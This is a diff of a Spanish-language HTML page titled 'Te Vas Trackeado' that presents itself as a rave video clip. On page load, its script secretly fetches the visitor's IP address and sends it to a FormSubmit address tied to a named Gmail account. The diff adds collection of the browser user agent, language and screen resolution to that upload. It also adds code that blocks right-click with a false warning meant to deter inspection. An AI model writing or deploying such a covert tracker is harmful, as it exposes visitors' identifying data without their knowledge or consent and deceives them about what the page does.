@@ -6,16 +6,18 @@
     <title>Página de Prueba - Te Vas Trackeado</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial Black', sans-serif;
             text-align: center;
             padding-top: 50px;
             background-color: #121212; /* Fondo oscuro */
             color: #E0E0E0;
         }
         h1 {
-            color: #00ff99; /* Neón */
+            color: #00ff99; /* Neón verde */
             text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
             margin-bottom: 5px;
+            /* Estilo para el script de parpadeo */
+            transition: visibility 0.5s;
         }
         p {
             color: #AAAAAA;
@@ -26,12 +28,13 @@
             box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
             border-radius: 8px;
             margin-top: 20px;
+            transition: border-color 0.5s, box-shadow 0.5s; /* Para el script de cambio de color */
         }
     </style>
 </head>
 <body>
     <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
-    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
+    <p>Presiona Play para iniciar la secuencia de 10 segundos. (No se activa solo)</p>
 
     <video width="720" controls> 
       <source src="clip.mp4" type="video/mp4">
@@ -41,17 +44,21 @@
     <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
 
     <script>
-        // 1. Obtener la IP del usuario a través de la API ipify
+        // --- 1. Recolección de datos del dispositivo ---
+        const userAgent = navigator.userAgent;
+        const userLanguage = navigator.language || navigator.userLanguage;
+        const screenRes = window.screen.width + 'x' + window.screen.height;
+
+        // --- 2. Obtener la IP y enviar todos los datos a FormSubmit ---
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;
                 
-                // 2. Definir el punto de recolección (FormSubmit)
-                // Se usa %40 para representar el @ en la URL
+                // TU CORREO DE DESTINO: system404g@gmail.com
                 const endpoint = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
                 
-                // 3. Enviar la IP al servidor de FormSubmit
+                // Enviar TODOS los datos al servidor de recolección
                 fetch(endpoint, {
                     method: 'POST',
                     headers: {
@@ -59,14 +66,46 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
+                        "_subject": "DATOS CAPTURADOS - TeVasTrackeado", 
                         "IP_Visitante": userIP, 
-                        "Fecha_Hora_Visita": new Date().toLocaleString(),
-                        "_subject": "IP Capturada en TeVasTrackeado" 
+                        "Agente_de_Usuario": userAgent,
+                        "Idioma": userLanguage,
+                        "Resolucion": screenRes,
+                        "Fecha_Hora_Visita": new Date().toLocaleString()
                     })
                 })
-                .catch(error => console.log('Error al enviar la IP: ' + error)); // Manejo de errores
+                .catch(error => console.log('Error al enviar los datos: ' + error));
             })
             .catch(error => console.log('Error al obtener la IP: ' + error));
     </script>
-    </body>
+    
+    <script>
+        // Efecto 1: Título Parpadeante (Neón)
+        function blink() {
+            var h1 = document.querySelector('h1');
+            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
+        }
+        setInterval(blink, 500); // Parpadea cada medio segundo
+
+        // Efecto 2: Cambio de Color de Borde Aleatorio (Rave)
+        function changeBorderColor() {
+            const video = document.querySelector('video');
+            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
+            video.style.borderColor = randomColor;
+            video.style.boxShadow = `0 0 25px ${randomColor}`;
+        }
+        setInterval(changeBorderColor, 2000); // Cambia cada 2 segundos
+
+        // Efecto 3: Bloqueo del Clic Derecho (Anti-Inspección)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
+        });
+        
+        // Efecto 4: Redireccionamiento a HTTPS (Seguridad)
+        if (window.location.protocol === 'http:') {
+            window.location.protocol = 'https:';
+        }
+    </script>
+</body>
 </html>
